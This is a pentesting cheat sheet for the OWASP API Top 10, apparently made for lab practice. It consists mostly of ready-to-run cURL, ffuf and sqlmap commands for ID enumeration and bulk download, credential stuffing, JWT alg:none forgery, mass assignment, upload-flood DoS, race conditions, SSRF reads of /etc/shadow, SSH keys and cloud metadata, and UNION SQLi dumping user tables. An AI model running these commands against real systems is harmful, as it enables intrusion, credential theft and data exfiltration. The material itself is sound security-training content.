---
title: "API Attacks"
description: "REST API enumeration, mass assignment, broken object auth, and rate limit bypass."
sidebar:
  order: 13
  label: "API Attacks"
---
> OWASP API Top 10: endpoint enumeration, BOLA/IDOR exploitation, broken auth, mass assignment, SSRF, SQLi, and more — all with cURL and ffuf.

---


## API Reconnaissance

### Locating Documentation

```bash
# Common documentation endpoints
curl -s http://TARGET/docs | jq
curl -s http://TARGET/api-docs | jq
curl -s http://TARGET/openapi.json | jq
curl -s http://TARGET/swagger.json | jq
curl -s http://TARGET/swagger/v1/swagger.json | jq
curl -s http://TARGET/api/v1/swagger | jq

# Search spec in source HTML
curl -s http://TARGET/ | grep -iE "swagger|openapi|api-docs|redoc"

# Fuzzing endpoints (multiple codes — 405 = endpoint exists but incorrect method)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://TARGET/api/v1/FUZZ \
     -mc 200,201,204,301,302,405
```

### JWT Authentication

```bash
# Login to obtain token
curl -s -X POST http://TARGET/api/v1/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq

# Save token
TOKEN=$(curl -s -X POST http://TARGET/api/v1/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"user@target.htb","password":"P@ssw0rd"}' | jq -r '.token')

# Use token in requests
curl -s http://TARGET/api/v1/resource \
     -H "Authorization: Bearer $TOKEN" | jq

# User registration
curl -s -X POST http://TARGET/api/v1/user/signup \
     -H "Content-Type: application/json" \
     -d '{"email":"attacker@test.com","password":"Test1234!","name":"Test"}' | jq
```

---

## API1 — BOLA / IDOR (Broken Object Level Authorization)

> Access other users' objects by changing the ID in the path.

### Enumerating IDs with Bash

```bash
# Script to iterate IDs and extract data from other users
for i in $(seq 1 200); do
    echo -n "ID $i: "
    curl -s "http://TARGET/api/v1/resource/$i" \
         -H "Authorization: Bearer $TOKEN" | jq -c '.'
done

# Filter only those that return data (exclude 404/error)
for i in $(seq 1 200); do
    resp=$(curl -s "http://TARGET/api/v1/resource/$i" \
                -H "Authorization: Bearer $TOKEN")
    echo "$resp" | jq -e '.id' > /dev/null 2>&1 && echo "ID $i: $resp"
done
```

### Enumerating IDs with ffuf

```bash
# Generate IDs wordlist
seq 1 200 > ids.txt

# Fuzz of the ID in the path
ffuf -w ./ids.txt \
     -u "http://TARGET/api/v1/resource/FUZZ" \
     -H "Authorization: Bearer $TOKEN" \
     -fr "\"detail\":\"Not found\"" \
     -mc 200

# Real example: yearly reports of suppliers
ffuf -w ./ids.txt \
     -u "http://TARGET/api/v1/supplier-companies/yearly-reports/FUZZ" \
     -H "Authorization: Bearer $TOKEN" \
     -fr "not found" \
     -mc 200
```

### Massive BOLA Data Download

```bash
# Download found files (PDF, etc.)
for i in $(seq 1 50); do
    curl -s "http://TARGET/api/v1/files/$i" \
         -H "Authorization: Bearer $TOKEN" \
         -o "file_$i.pdf" 2>/dev/null
    file "file_$i.pdf" | grep -q PDF && echo "Downloaded: file_$i.pdf"
done
```

---

## API2 — Broken Authentication

### Credential Stuffing with ffuf (Dual-Wordlist)

```bash
# ffuf with two simultaneous wordlists
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt:PASS \
     -w emails.txt:EMAIL \
     -u http://TARGET/api/v1/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"Email":"EMAIL","Password":"PASS"}' \
     -fr "Invalid Credentials" \
     -mc 200

# Create target emails list
cat > emails.txt << EOF
admin@target.htb
user@target.htb
john@target.htb
EOF

# Brute-force of password for known user
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt \
     -u http://TARGET/api/v1/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"Email":"admin@target.htb","Password":"FUZZ"}' \
     -fr "Invalid Credentials" \
     -mc 200
```

### JWT Token — Analysis and Manipulation

```bash
# Decode header and payload (without signature verification)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
echo "eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJ1c2VyIn0" | base64 -d

# Parts of the JWT: header.payload.signature
TOKEN="eyJ...header...==.eyJ...payload...==.signature"
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
echo $PAYLOAD | base64 -d | jq

# If signature is not verified -> modify payload and re-encode (alg:none bypass)
# Header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# Payload: {"user_id":"1","role":"admin"}
echo -n '{"user_id":"1","role":"admin"}' | base64 | tr -d '='
# JWT without signature: HEADER.PAYLOAD.
```

---

## API3 — Broken Object Property Level Auth (Mass Assignment)

> Send extra fields in the body that the server processes even though it shouldn't.

```bash
# Normal user request
curl -s -X PATCH http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"My Company"}'

# Mass Assignment: add privileged fields
curl -s -X PATCH http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"My Company","isExemptedFromMarketplaceFee":true}'

# Other typical fields to test:
# "role":"admin"
# "is_admin":true
# "verified":true
# "credit":9999
# "balance":99999
# "subscription":"premium"
# "approved":true

# Confirm that the field was modified (GET of the resource)
curl -s http://TARGET/api/v1/user/profile \
     -H "Authorization: Bearer $TOKEN" | jq
```

---

## API4 — Unrestricted Resource Consumption

```bash
# Generate large file for DoS/storage abuse
dd if=/dev/urandom of=test_large.pdf bs=1M count=30   # 30 MB

# Upload multiple times to exhaust resources
for i in {1..10}; do
    curl -s -X POST http://TARGET/api/v1/upload \
         -H "Authorization: Bearer $TOKEN" \
         -F "file=@test_large.pdf" | jq
done

# Test rate limits:
for i in {1..50}; do
    curl -s -X POST http://TARGET/api/v1/resource \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"query":"test"}' -o /dev/null
done
```

---

## API5 — BFLA (Broken Function Level Authorization)

> Access admin functions/endpoints while being a normal user.

```bash
# Typical admin endpoints to test
curl -s http://TARGET/api/v1/admin/users \
     -H "Authorization: Bearer $USER_TOKEN" | jq

# View another user's reports without being admin
curl -s "http://TARGET/api/v1/reports?user_id=1" \
     -H "Authorization: Bearer $USER_TOKEN" | jq

# Change HTTP method — GET may be protected, POST not
curl -s -X POST http://TARGET/api/v1/admin/action \
     -H "Authorization: Bearer $USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"userId":1}' | jq

# Test endpoints with IDs of other roles
curl -s "http://TARGET/api/v1/partner-companies/1/financials" \
     -H "Authorization: Bearer $USER_TOKEN" | jq
```

---

## API6 — Unrestricted Access to Sensitive Business Flows

```bash
# Identify business data exposed in responses
curl -s http://TARGET/api/v1/products \
     -H "Authorization: Bearer $TOKEN" | jq '.[].discount'

# Exploit exposed prices/discounts
# E.g.: the endpoint returns the discounted price before it expires
curl -s "http://TARGET/api/v1/products/1" \
     -H "Authorization: Bearer $TOKEN" | jq '{price, discountPrice, discountExpiry}'

# Add to cart with reduced price (if price comes from client-side)
curl -s -X POST http://TARGET/api/v1/cart \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"productId":1,"quantity":999,"price":0.01}' | jq

# Race condition to leverage discount window
for i in {1..20}; do
    curl -s -X POST http://TARGET/api/v1/purchase \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"productId":1}' &
done
wait
```

---

## API7 — SSRF via API

```bash
# Identify fields that accept URIs/URLs in the API body
# Example: certificate field or file in URI format
curl -s -X POST http://TARGET/api/v1/company \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"http://OUR_IP:8000/test"}' | jq

# Listener to confirm SSRF
nc -lnvp 8000

# LFI via file:// scheme
curl -s -X POST http://TARGET/api/v1/company \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}' | jq

# Read the file: if the URI field is stored and then a GET is made
curl -s "http://TARGET/api/v1/company/1/certificate" \
     -H "Authorization: Bearer $TOKEN"

# Target files via SSRF file://
# file:///etc/passwd
# file:///etc/shadow
# file:///proc/self/environ
# file:///var/www/html/config.php
# file:///home/user/.ssh/id_rsa

# Internal port scan via SSRF
seq 1 65535 > ports.txt
ffuf -w ./ports.txt \
     -u http://TARGET/api/v1/resource \
     -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"uri":"http://127.0.0.1:FUZZ"}' \
     -fr "Connection refused"
```

---

## API8 — Security Misconfiguration (SQLi in APIs)

```bash
# SQL Injection in path parameters
# Endpoint: /api/v1/products/{Name}/count
curl -s "http://TARGET/api/v1/products/laptop/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# Basic SQLi in the path
curl -s "http://TARGET/api/v1/products/laptop' OR 1=1 --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# URL-encoded
curl -s "http://TARGET/api/v1/products/laptop%27%20OR%201%3D1%20--/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# UNION-based to extract data
curl -s "http://TARGET/api/v1/products/x' UNION SELECT 1,2,3 --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# Extract users table
curl -s "http://TARGET/api/v1/products/x' UNION SELECT username,password,email FROM users --/count" \
     -H "Authorization: Bearer $TOKEN" | jq

# SQLi in JSON body
curl -s -X POST http://TARGET/api/v1/search \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"laptop\" OR 1=1 --"}' | jq

# SQLMap against API endpoint
sqlmap -u "http://TARGET/api/v1/products/*/count" \
       --headers="Authorization: Bearer $TOKEN" \
       --level=3 --risk=2 --batch
```

---

## API9 — Improper Inventory Management (Legacy Versions)

```bash
# Test legacy API versions
curl -s http://TARGET/api/v0/user/info \
     -H "Authorization: Bearer $TOKEN" | jq

# Endpoints without auth in old versions
curl -s http://TARGET/api/v0/admin/users | jq
curl -s http://TARGET/api/v1/users | jq
curl -s http://TARGET/v1/api/users | jq
curl -s http://TARGET/api/users | jq

# Version fuzzing
ffuf -w versions.txt \
     -u http://TARGET/api/FUZZ/users \
     -mc 200,201,401,403,405
# versions.txt: v0, v1, v2, v3, v0.1, v1.0, v1.1, v2.0, beta, dev, internal, old, backup

# Search endpoints without auth in version v0
for endpoint in users admin reports accounts settings; do
    echo -n "v0/$endpoint: "
    curl -s -o /dev/null -w "%{http_code}" "http://TARGET/api/v0/$endpoint"
    echo ""
done

# Export hashes or sensitive data from legacy endpoint
curl -s http://TARGET/api/v0/users | jq '.[].password_hash'
```

---

## API10 — Unsafe API Consumption

```bash
# Identify if the API trusts third-party data
# E.g.: field processed from an external API without sanitizing

# Verify what data arrives from the third party
curl -s http://THIRD_PARTY_API/data | jq

# Attempt injection in third-party data if controllable
# (create a server serving malicious data and use SSRF to point to it)
python3 -c "
import http.server, json

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        # Malicious data with SQLi/XSS
        data = [{'name': \"'; DROP TABLE users; --\", 'value': '<script>alert(1)</script>'}]
        self.wfile.write(json.dumps(data).encode())
    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
"
```

---

## OWASP API Top 10 Table — Quick Reference

| # | Vulnerability | Key Indicator | Attack |
|---|----------------|-------------|--------|
| API1 | BOLA/IDOR | Sequential IDs in URL | Iterate ID, access external resources |
| API2 | Broken Auth | Exposed login endpoint | ffuf dual-wordlist, JWT tamper |
| API3 | Mass Assignment | PATCH/POST accepts extra fields | Add `"role":"admin"` in body |
| API4 | Unrest. Resource | Unlimited upload | dd 30MB + upload loop |
| API5 | BFLA | Accessible admin functions | Use user token on /admin/ endpoint |
| API6 | Business Flow | Prices/discounts in response | Timing attacks, race conditions |
| API7 | SSRF | URI/URL field in body | `file:///etc/passwd`, port scan |
| API8 | Sec. Misconfig | ID or name in path param | `' OR 1=1 --`, UNION SELECT |
| API9 | Improper Inv. | API v0, /dev/, /beta/ without auth | Enumerate old versions |
| API10 | Unsafe Consump. | Third-party data processed | Injection in provider data |

---

## Pitfalls / Gotchas

- **BOLA with own token:** always use the normal user token when accessing others' resources — do not use the admin token (if you have it). The objective is to demonstrate that a normal user can view external resources.
- **ffuf dual-wordlist:** the `-w file1:KEYWORD1 -w file2:KEYWORD2` mode performs a Cartesian product — with 1000 emails × 1000 passwords = 1M requests. Properly filter the password wordlist beforehand.
- **Mass Assignment depends on the framework:** Django REST Framework, Laravel, Rails, and Express have different configurations. Test all fields in the schema (GET the object first → view all fields).
- **JWT `alg:none`:** many modern libraries do not accept `alg:none` by default. If it fails, try `"alg":"HS256"` with an empty signature or HMAC with a weak key.
- **SSRF with file:// might be blocked:** if `file://` does not work, try `http://169.254.169.254/` (AWS metadata) or `http://localhost/` for internal services.
- **SQLi in path params URL-encode:** quotes and spaces in the path require URL encoding: `'` → `%27`, ` ` → `%20`, `--` → `%2D%2D`. Some servers reject double encoding.
- **API v0 might require different auth:** legacy versions sometimes use Basic Auth instead of JWT. Try `Authorization: Basic YWRtaW46YWRtaW4=` (admin:admin).
- **405 Method Not Allowed = endpoint exists:** never ignore a 405 — the endpoint exists but the method is forbidden. Try GET, POST, PUT, PATCH, DELETE on that endpoint.
- **Swagger documentation is the complete map:** if `/openapi.json` is present, read it entirely — it lists all endpoints, parameters, schemas, and response codes. It is the biggest recon finding.

---

## Related Cheatsheets

- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — ffuf for API endpoint discovery
- [Web Requests](/en/metodologias/fundamentos/web-requests/) — cURL for CRUD operations in APIs
- [Broken Authentication](/en/metodologias/web/broken-authentication/) — brute-force techniques applicable to APIs
- [Server-side Attacks](/en/metodologias/web/server-side-attacks/) — SSRF in depth
- [Attacking GraphQL](/en/metodologias/web/attacking-graphql/) — GraphQL APIs
